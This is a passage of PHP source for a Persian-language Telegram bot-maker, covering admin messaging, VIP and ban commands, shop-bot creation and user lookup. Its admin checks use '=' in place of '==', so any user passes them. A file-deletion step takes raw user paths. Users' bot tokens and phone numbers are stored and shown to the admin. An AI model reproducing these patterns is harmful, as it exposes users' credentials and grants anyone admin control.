     if ($textmessage == '📤ارسال پیام به کاربر📡') {
        if ($from_id = $admin) {
     
     sendmessage($chat_id,"متن پیام خود را وارد کنید");
     save("data/$from_id/step.txt","mess");
     }else{
     sendmessage($chat_id,"شما ادمین نیسید");
     }
     }
 if ($step == 'mess') {
    $tm = $textmessage;
    $myfile2 = fopen("data/message.txt", 'w') or die("Unable to open file!");	
fwrite($myfile2, "$tm\n");
fclose($myfile2);

    sendmessage($chat_id,"ای دی عددی کاربر را ارسال کنید");
    save("data/$from_id/step.txt","messa");
 }

    if ($step == 'messa') {
      $message = file_get_contents("data/message.txt");
      $f = $textmessage;
     sendmessage($f,"سلام $name 👋\n📝ادمین برای شما یک پیام ارسال کرد.\nمتن پیام↙️\n\n$message");
     sendmessage($admin,"پیام شما با موفقیت به کاربر موردنظر ارسال شد✅");
     sendmessage($adminn,"اونیکی ادمین یه پیام فرستاد برا=$f\nمتن پیامش=$message");
     save("data/$from_id/step.txt","none");
     }
        if ($textmessage == '📤ارسال پیام به کاربر📡') {
        if ($from_id = $adminn) {
     
     sendmessage($chat_id,"متن پیام خود را وارد کنید2");
     save("data/$from_id/step.txt","messs");
     }else{
     sendmessage($chat_id,"شما ادمین نیسید");
     }
     }
 if ($step == 'messs') {
    $tm = $textmessage;
    $myfile2 = fopen("data/message.txt", 'w') or die("Unable to open file!");	
fwrite($myfile2, "$tm\n");
fclose($myfile2);

    sendmessage($chat_id,"ای دی عددی کاربر را ارسال کنید2");
    save("data/$from_id/step.txt","messaa");
 }

    if ($step == 'messaa') {
      $message = file_get_contents("data/message.txt");
      $f = $textmessage;
     sendmessage($f,"سلام $name 👋\n📝ادمین برای شما یک پیام ارسال کرد.\nمتن پیام↙️\n\n$message");
     sendmessage($adminn,"پیام شما با موفقیت به کاربر موردنظر ارسال شد✅");
     sendmessage($admin,"اونیکی ادمین یه پیام فرستاد برا=$f\nمتن پیامش=$message");
     save("data/$from_id/step.txt","none");
     }

//====vip=======

if ($textmessage == '🌀بخش فروشگاه ویژه🌀') {
   if (strpos($vip , "$from_id") !== false  ) { var_dump(makereq('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>'به بخش ویژه خوش آمدید لطفا یک گذیته انتخاب کنید',
    'reply_markup'=>json_encode([
    'keyboard'=>[
    [
                   ['text'=>"🌀ساخت فروشگاه ویژه🌀"]
                ],
                
                 [
                   ['text'=>"❌حذف ربات ویژه❌"]
                ],
                [
                ['text'=>'✔️بروزرسانی ربات ویژه✔️']
                ],
                [
                ['text'=>'🔙 برگشت']
                ],
                ],
    'resize_keyboard'=>true,
    ])
    ]));
    }else{
    sendmessage($chat_id,"حساب شما vip نیست در منوی اصلی حساب خود را vip کنید");
    }
    }
    elseif ($textmessage == '🌀ساخت فروشگاه ویژه🌀') {
if (strpos($vip , "$from_id") !== false  ) {
$tedad = file_get_contents("data/$from_id/tedad.txt");
if ($tedad >= 599999999) {
SendMessage($chat_id,"⛔️ تعداد فروشگاه های ساخته شده شما به یک عدد رسیده است!
⚠️از آنجا که محدودیت ساخت یک عدد است اول باید یک فروشگاه را پاک کنید!");
return;
}
save("data/$from_id/step.txt","createvip bot");
var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"💠 توکن را وارد کنید.. : ",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                   ['text'=>"🔙 برگشت به منوی ویژه"]
                ]
                
             ],
             'resize_keyboard'=>false
         ])
      ]));
      
}else{
sendmessage($chat_id,"شما ادمین نیسید");
}
}
if ($textmessage == '🔙 برگشت به منوی ویژه') {

     if (strpos($vip , "$from_id") !== false  ) { var_dump(makereq('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>'به بخش ویژه خوش آمدید لطفا یک گذیته انتخاب کنید',
    'reply_markup'=>json_encode([
    'keyboard'=>[
    [
                   ['text'=>"🌀ساخت فروشگاه ویژه🌀"]
                ],
                
                 [
                   ['text'=>"❌حذف ربات ویژه❌"]
                ],
                [
                ['text'=>'✔️بروزرسانی ربات ویژه✔️']
                ],
                [
                ['text'=>'🔙 برگشت']
                ],
                ],
    'resize_keyboard'=>true,
    ])
    ]));
    }else{
    sendmessage($chat_id,"حساب شما vip نیست در منوی اصلی حساب خود را vip کنید");
    }
    }
    if ($textmessage == '😍vip کردن اکانت✳️') {
    if (strpos($bans , "$from_id") !== false  ) {
    sendmessage($chat_id,"شما از ربات بن شده اید لطفا پیام ندهید");
    }else{
     sendmessage($chat_id,"$vipkardan");
     }
     }
     /*
     if ($textmessage == 'vip کردن کاربر') {
         if ($from_id = $admin) {
         sendmessage($chat_id,"ادمین عزیز برای وی ای پی کردن کاربر از دستور طیر استافاده کنید\n/setvip ID\nمثال\n/setvip 75040019");
         }else{
    sendmessage($chat_id,"شما ادمین نیسید");
         }
         }*/
         /*
          elseif (strpos($textmessage , "/setvip" ) !== false ) {
if ($from_id == $admin) {
$text = str_replace("/setvip","",$textmessage);
$myfile2 = fopen("data/vip.txt", 'a') or die("Unable to open file!");	
fwrite($myfile2, "$text\n");
fclose($myfile2);
SendMessage($admin,"کاربر مورد نظر vip شد");
sendmessage($ttt,"اکانت شما با موفقیت vip شد");
sendmessage($adminn,"اونیکی ادمین $ttt رو vip کرد");
}else{
sendmessage($chat_id,"شما اومین نیسید");
}
}*/
elseif (strpos($textmessage , "/setvip" ) !== false ) {
if ($from_id == $adminn) {
$text = str_replace("/setvip","",$textmessage);
$myfile2 = fopen("data/vip.txt", 'a') or die("Unable to open file!");	
fwrite($myfile2, "$text\n");
fclose($myfile2);
SendMessage($adminn,"کاربر مورد نظر vip شد");
sendmessage($ttt,"اکانت شما با موفقیت vip شد");

}else{
sendmessage($chat_id,"شما اومین نیسید");
}
}
if ($textmessage == 'vip کردن کاربر') {

         if ($from_id = $adminn) {
         
        sendmessage($chat_id,"ادمین عزیز برای وی ای پی کردن کاربر از دستور زیر استافاده کنید\n/setvip ID\nمثال\n/setvip 75040019");
         }else{
    sendmessage($chat_id,"شما ادمین نیسید");
         }
         }
/*        
if ($textmessage == 'حذف vip') {
    if ($from_id = $admin) {
    
    sendmessage($chat_id,"ادمین عزیز برای حذف وی ای پی از دیتور زیر استفاده کنید\n/delvip ID");
    }else{
    sendmessage($chat_id,"شما ادمین نیستید");
    
    }
    }*/
     if ($textmessage == '🌀تعیین کانال ربات🌀') {
         if ($from_id = $admin) {

         sendmessage($chat_id,"✅برای ست کردن کانال شما بایدبه شکل زیر عمل کنید\n /setchannel channel\nبرای مثال\n/setchannel StarsTM\n⚠️توجه کنی که نباید از@ استفاده کنید⚠️");
         }else{
    sendmessage($chat_id,"شما ادمین نیسید");
    
    }
    }
   /*
   if ($textmessage == 'حذف vip') {
    if ($from_id = $adminn) {
    
    sendmessage($chat_id,"ادمین عزیز برای حذف وی ای پی از دیتور زیر استفاده کنید\n/delvip ID");
    }else{
    sendmessage($chat_id,"شما ادمین نیستید");
    
    }
    }
    /*
    elseif (strpos($textmessage , "/delvip" ) !== false ) {
if ($from_id == $admin) {
$text = str_replace("/delvip","",$textmessage);
			$newlist = str_replace($text,"",$vip);
			save("data/vip.txt",$newlist);
SendMessage($admin,"کاربر مکرد نظر از لیست وی ای پی حذف شد.");
sendmessage($text."شما از لیست وی ای پی حذف شدبد");
sendmessage($adminn,"اوتیکی ادمین $text رو از ادینی در اورد");
}else{
sendmessage($chat_id,"شما ادمین نیسید");
}
}*/
elseif (strpos($textmessage , "/delvip" ) !== false ) {
if ($from_id == $adminn) {
$text = str_replace("/delvip","",$textmessage);
			$newlist = str_replace($text,"",$vip);
			save("data/vip.txt",$newlist);
SendMessage($adminn,"کاربر مورد نظر از لیست وی ای پی حذف شد.");
sendmessage($text."شما از لیست وی ای پی حذف شدبد");

}else{
sendmessage($chat_id,"شما ادمین نیسید");
}
}
elseif ($step == 'createvip bot') {
$token = $textmessage ;

   $userbot = json_decode(file_get_contents('https://api.telegram.org/bot'.$token .'/getme'));
   //==================
   function objectToArrays( $object ) {
    if( !is_object( $object ) && !is_array( $object ) )
    {
    return $object;
    }
    if( is_object( $object ) )
    {
    $object = get_object_vars( $object );
    }
   return array_map( "objectToArrays", $object );
   }

 $resultb = objectToArrays($userbot);
 $un = $resultb["result"]["username"];
 $ok = $resultb["ok"];
  if($ok != 1) {
   //Token Not True
   SendMessage($chat_id,"⛔️ توکن نامعتبر!");
  }
  else
  {
  SendMessage($chat_id,"❇️ در حال ساخت فروشگاه شما ...");
  if (file_exists("bots/vip/$un/index.php")) {
  $source = file_get_contents("bot/indexvip.php");
  $source = str_replace("*TOKEN*",$token,$source);
  $source = str_replace("*ADMIN*",$from_id,$source);
  $source = str_replace("*botid*",$un,$source);
  save("bots/vip/$un/index.php",$source); 
  file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=https://neman.elithost.ir/r/bots/botsaz/$botid/bots/vip/$un/index.php");

var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"  ✅ ربات شما با موفقیت آپدیت شد.

[👆 کلیک برای ورود به ربات.](https://telegram.me/$un)",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                 ['text'=>"🔙 برگشت به منوی ویژه"]
                ]
                
             ],
                'resize_keyboard'=>false
         ])
      ]));
  }
  else {
  $tedad = file_get_contents("data/$from_id/tedad.txt");
  $newtedad = $tadad + 1;
  save("data/$from_id/tedad.txt","$newtedad");
  save("data/$from_id/step.txt","none");
  save("data/$from_id/botsv.txt","$un");
  
  mkdir("bots/$un");
  mkdir("bots/$un/data");
  mkdir("bots/$un/data/btn");
  mkdir("bots/$un/data/words");
 save("data/$from_id/token.txt","$token");
  mkdir("bots/$un/data/setting");
  mkdir("bots/$un/data/admin");
  mkdir("bots/$un/data/codes");
  mkdir("bots/$un/data/products");
  mkdir("bots/$un/data/products/new.txt");
  mkdir("bots/$un/data/userss");
  mkdir("bots/$un/data/users");
 
$myfile2 = fopen("data/tokens.txt", 'a') or die("Unable to open file!");	
fwrite($myfile2, "$token\n");
fclose($myfile2);

  save("bots/$un/data/blocklist.txt","");
  save("bots/$un/data/last_word.txt","");
  save("bots/$un/data/pmsend_txt.txt","Message Sent!");
  save("bots/$un/data/start_txt.txt","Hello World!");
  save("bots/$un/data/forward_id.txt","");
  save("bots/$un/data/userss.txt","$from_id\n");
  mkdir("bots/$un/data/$from_id");
  save("bots/$un/data/$from_id/type.txt","admin");
  save("bots/$un/data/$from_id/step.txt","none");
  save("data/textbuy.txt","$username");
  save("bots/$un/data/btn/btn1_name","");
  save("bots/$un/data/btn/btn2_name","");
  save("bots/$un/data/btn/btn3_name","");
  save("bots/$un/data/btn/btn4_name","");
  
  save("bots/$un/data/btn/btn1_post","");
  save("bots/$un/data/btn/btn2_post","");
  save("bots/$un/data/btn/btn3_post","");
  save("bots/$un/data/btn/btn4_post","");
 
  save("bots/$un/data/setting/sticker.txt","✅");
  save("bots/$un/data/setting/video.txt","✅");
  save("bots/$un/data/setting/voice.txt","✅");
  save("bots/$un/data/setting/file.txt","✅");
  save("bots/$un/data/setting/photo.txt","✅");
  save("bots/$un/data/setting/music.txt","✅");
  save("bots/$un/data/setting/forward.txt","✅");
  
  $source = file_get_contents("bot/indexvip.php");
  $source = str_replace("*TOKEN*",$token,$source);
  $source = str_replace("*ADMIN*",$from_id,$source);
  $source = str_replace("*botid*",$un,$source);
  save("bots/vip/$un/index.php",$source); 
  
  file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=https://neman.elithost.ir/r/bots/botsaz/$botid/bots/vip/$un/index.php");

var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"✅ فروشگاه شما با موفقیت ساخته شد. 
‼️دستور panel را داخل فروشگاه خود ارسال نمایید سپس از طریق دکمه تنظیم کانال , کانال خود را تنظیم کنید.
[ فروشگاه شما🔰](https://telegram.me/$un)",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                   ['text'=>"🌀ساخت فروشگاه ویژه🌀"]
                ],
                
                 [
                   ['text'=>"❌حذف ربات ویژه❌"]
                ],
                [
                ['text'=>'✔️بروزرسانی ربات ویژه✔️']
                ],
                [
                ['text'=>'🔙برگشت']
                ],
                
             ],
             'resize_keyboard'=>false
         ])
      ]));
  }
}
}
if ($textmessage == '✔️بروزرسانی ربات ویژه✔️') {

save("data/$from_id/step.txt","updd");
var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"💠 توکن ربات خود را وارد کنید.. : ",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                   ['text'=>"🔙 برگشت به منوی ویژه"]
                ]
                
             ],
             'resize_keyboard'=>false
         ])
      ]));
}
elseif ($step == 'updd') {
$token = $textmessage ;

   $userbot = json_decode(file_get_contents('https://api.telegram.org/bot'.$token .'/getme'));
   //==================
   function objectToArrays( $object ) {
    if( !is_object( $object ) && !is_array( $object ) )
    {
    return $object;
    }
    if( is_object( $object ) )
    {
    $object = get_object_vars( $object );
    }
   return array_map( "objectToArrays", $object );
   }

 $resultb = objectToArrays($userbot);
 $un = $resultb["result"]["username"];
 $ok = $resultb["ok"];
  if($ok != 1) {
   save("data/$from_id/step.txt","none");
   var_dump(makereq('sendmessage',[
   'chat_id'=>$chat_id,
   'text'=>'توکن معتبر نیست',
   'reply_markup'=>json_encode([
   'keyboard'=>[
   [
   ['text'=>'🔙 برگشت به منوی ویژه']
   ],
   ],
   'resize_keyboard'=>true,
   ])
   ]));
   
  }
  else
  {
  SendMessage($chat_id,"❇️ در حال آپدیت فروشگاه شما ...");
  if (file_exists("bots/vip/$un/index.php")) {
  $source = file_get_contents("bot/indexvip.php");
  $source = str_replace("*TOKEN*",$token,$source);
  $source = str_replace("*ADMIN*",$from_id,$source);
  $source = str_replace("*botid*",$un,$source);
  save("bots/vip/$un/index.php",$source); 
  file_get_contents("https://api.telegram.org/bot$token/sendmessage?chat_id=$from_id&text=ok");
  file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=https://neman.elithost.ir/r/bots/botsaz/$botid/bots/vip/$un/index.php");

var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"  ✅ ربات شما با موفقیت آپدیت شد.

[👆 کلیک برای ورود به ربات.](https://telegram.me/$un)",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                 ['text'=>"🔙 برگشت"]
                ]
                
             ],
                'resize_keyboard'=>false
         ])
      ]));
  }else{
  sendMessage($chat_id,"شما هنوز همچین رباتی نساخته اید");
  }
  }
  }
    elseif (strpos($textmessage , "/ban" ) !== false ) {
if ($from_id == $adminn) {
$text = str_replace("/ban","",$textmessage);
$myfile2 = fopen("data/ban.txt", 'a') or die("Unable to open file!");	
fwrite($myfile2, "$text\n");
fclose($myfile2);
SendMessage($adminn,"کاربر مورد نظر بن شد");
sendmessage($text,"متاسفانه به دستور ادمین شما بن شدید.سیکتیر");

}else{
sendmessage($chat_id,"شما ادمین نیسید");
}
}
elseif (strpos($textmessage , "/unban" ) !== false ) {
if ($from_id == $adminn) {
$text = str_replace("/unban","",$textmessage);
			$newlist = str_replace($text,"",$ban);
			save("data/ban.txt",$newlist);
SendMessage($adminn,"کاربر مورد نظر از لیست بن ها حذف شد.");
sendmessage($text."شما از لیست بن حذف شدید خوجل پسر");

}else{
sendmessage($chat_id,"شما ادمین نیسید");
}
}
if($textmessage == 'بن کردن کاربر') {
sendmessage($chat_id,"ادمین عزیز برای بن کردن کاربر از دستور\n/banID\nبه جای ID ایدی عددی کاربر را بگذارید");
}
if($textmessage == 'آن بن کردن کاربر') {
sendmessage($chat_id,"ادمین عزیز برای آن بن کردن کاربر از دستور\n/unbanID\nبه جای ID ایدی عددی کاربر را بگذارید");
}
 elseif (strpos($textmessage , "/ban" ) !== false ) {
if ($from_id == $admin) {
$text = str_replace("/ban","",$textmessage);
$myfile2 = fopen("data/ban.txt", 'a') or die("Unable to open file!");	
fwrite($myfile2, "$text\n");
fclose($myfile2);
SendMessage($adminn,"کاربر مورد نظر بن شد");
sendmessage($text,"متاسفانه به دستور ادمین شما بن شدید.سیکتیر");

}else{
sendmessage($chat_id,"شما ادمین نیسید");
}
}
elseif (strpos($textmessage , "/unban" ) !== false ) {
if ($from_id == $admin) {
$text = str_replace("/unban","",$textmessage);
			$newlist = str_replace($text,"",$ban);
			save("data/ban.txt",$newlist);
SendMessage($adminn,"کاربر مورد نظر از لیست بن ها حذف شد.");
sendmessage($text."شما از لیست بن حذف شدید خوجل پسر");

}else{
sendmessage($chat_id,"شما ادمین نیسید");
}
}
if ($textmessage == '👤اطلاعات کاربر💀') {
if ($from_id = $adminn) {
  save("data/$from_id/step.txt","numm");
  sendmessage($chat_id,"ایدی عددی کاربر را ارسال کنید");
  }
  }
  if ($step == 'numm') {
     if (file_exists("data/$textmessage/num.txt")) {
     $num = file_get_contents("data/$textmessage/num.txt");
    $token = file_get_contents("data/$textmessage/token.txt"); sendmessage($chat_id,"شماره کاربر:\n`$num`\nایدی عددی\n`$textmessage`\nتوکن اخرین ربات ساخته شده\n`$token`");
    
     }else{
     sendmessage($chat_id,"این کاربر شمارشو تایید نکرده ");
     save("data/$from_id/step.txt","none");
     }
     }
     if ($textmessage == '👤اطلاعات کاربر1💀') {
if ($from_id = $admin) {
  save("data/$from_id/step.txt","nummm");
  sendmessage($chat_id,"ایدی عددی کاربر را ارسال کنید");
  }
  }
  if ($step == 'nummm') {
     if (file_exists("data/$textmessage/num.txt")) {
     $num = file_get_contents("data/$textmessage/num.txt");
    $token = file_get_contents("data/$textmessage/token.txt");
    $mail = file_get_contents("data/$textmessage/mail.txt"); sendmessage($chat_id,"شماره کاربر:\n`$num`\nایدی عددی\n`$textmessage`\nتوکن اخرین ربات ساخته شده\n`$token`");
    
     }else{
     sendmessage($chat_id,"این کاربر شمارشو تایید نکرده");
     save("data/$from_id/step.txt","none");
     }
     }
        if ($textmessage == 'حذف اطلاعات کاربر') {
        if ($from_id = $adminn) {
        save("data/$from_id/step.txt","delf");
        sendmessage($chat_id,"لطفا مسیر را وارد کنید (از پوشه دیتا به اونور)");
        }
        }
           if ($step == 'delf') {
           if (!file_exists("data/$textmessage")) {
           sendmessage($chat_id,"همچین پوشه و یا فایلی پیدا نشد");
           save("data/$from_id/step.txt","none");
           }else{
         $t = $textmessage; if(preg_match("'(.*)(.txt)'",$textmessage)){
unlink("data/$textmessage");
sendmessage($chat_id,"فایل مورد نظر حذف شد");
save("data/$from_id/step.txt","none");
}else{
rmdir("data/$textmeesage");
sendmessage($chat_id,"پوشه مورد نظر حذف شد");
save("data/$from_id/step.txt","none");
}
}
}
     
  ?>
